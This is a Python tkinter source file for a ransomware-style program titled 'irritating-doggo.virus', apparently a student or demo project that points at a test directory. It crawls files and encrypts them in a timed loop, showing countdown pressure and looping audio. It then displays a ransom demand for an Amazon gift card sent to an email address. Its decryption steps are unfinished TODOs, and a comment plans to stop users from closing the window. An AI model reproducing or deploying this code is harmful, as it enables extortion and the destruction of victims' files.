import tkinter as tk
from tkinter import filedialog
from datetime import datetime as dt
import math
import Victim.crawler.crawler as crawler
import pyaudio as pa
import wave
import threading

dirs_to_skip = ["Program Files (x86)", "Program Files", "Windows", "Public", "Applications"]
start_dir = "./run_test_dir"
file_list = crawler.crawl_files(start_dir, dirs_to_skip)
for i in range(10):
    file_list[i].encrypt()
next_file_index = 10
last_click = dt.now()
loop = True

def counter_label(label):
    def count():
        global next_file_index
        global last_click
        time_left = math.ceil(3 - (dt.now() - last_click).total_seconds())
        if time_left < 0:
            time_left = 0
        label.config(text="Another file will be encrypted in " + str(time_left))
        if (dt.now()-last_click).total_seconds() > 3.0:
            if next_file_index < len(file_list):
                file_list[next_file_index].encrypt()
                next_file_index += 1
                files_encrypted_label.config(text="encrypted " + str(next_file_index+1) + " files")
            else:
                files_encrypted_label.config(text="All files are now encrypted :)")
        label.after(10, count)
    count()

def click():
    global last_click
    last_click = dt.now()

def surrender():
    for i in range(next_file_index, len(file_list)-1):
        file_list[i].encrypt()
        files_encrypted_label.config(text="All files are now encrypted :)")
    window = tk.Toplevel(root)
    window.protocol('WM_DELETE_WINDOW', fake_close)
    info_label = tk.Label(window, text="""You will need to send us a $10 Amazon gift card to get your files back
                                        \nYou will also need to attach a file generated by us.
                                        \nSend these files and the code for the gift card to irritatingdoggo@gmail.com
                                        \nYou must keep this open until we reply with your decryption key.
                                        \nClick continue after receiving our reply.""")
    info_label.pack()
    continue_button = tk.Button(window, text='Continue', width=25, command=select_decryption_key)
    ok_button = tk.Button(window, text='Ok', width=25, command=lambda:select_directory(continue_button))
    ok_button.pack()

def select_directory(continue_button):
    dir_name = filedialog.askdirectory(title='Select a directory to store information required to get your files back.')
    while dir_name == "":
        dir_name = filedialog.askdirectory(title='Select a directory to store information required to get your files back.')
    print(dir_name)
    # TODO write the key files that are needed
    continue_button.pack()

def select_decryption_key():
    global loop
    file_name = filedialog.askopenfilename(title='Select the file you downloaded from our email.')
    while file_name == "":
        file_name = filedialog.askopenfilename(title='Select the file you downloaded from our email.')
    print(file_name)
    # TODO decrypt their files
    window = tk.Toplevel(root)
    window.protocol('WM_DELETE_WINDOW', fake_close)
    info_label = tk.Label(window, text="""Your files are now decrypted and you can close these popups""")
    info_label.pack()
    done_button = tk.Button(window, text='Close', width=25, command=done)
    done_button.pack()
    loop = False

def done():
    root.destroy()

def fake_close():
    pass
    print("fake_close")
    # TODO remove this root.destroy to prevent them from immediately closing it
    root.destroy()

def play_audio():
    wf = wave.open("sound.wav")
    p = pa.PyAudio()
    stream = p.open(format=p.get_format_from_width(wf.getsampwidth()),
                    channels=wf.getnchannels(),
                    rate=wf.getframerate(),
                    output=True)
    data = wf.readframes(1024)
    while loop:
        stream.write(data)
        data = wf.readframes(1024)
        if data == b'':
            wf.rewind()
            data = wf.readframes(1024)
    stream.stop_stream()
    stream.close()
    p.terminate()

my_thread = threading.Thread(target=play_audio)
my_thread.start()
root = tk.Tk()
root.title("irritating-doggo.virus")
warning_label = tk.Label(root, fg="red", text="Closing this program will result in your files being lost forever")
warning_label.pack()
label = tk.Label(root, fg="red")
label.pack()
files_encrypted_label = tk.Label(root, fg="black", text="encrypted 10 files")
files_encrypted_label.pack()
counter_label(label)
button = tk.Button(root, text='Prevent Encryption', width=25, command=click)
button.pack()
button = tk.Button(root, text='I give up', width=25, command=surrender)
button.pack()
root.protocol('WM_DELETE_WINDOW', fake_close)
root.mainloop()
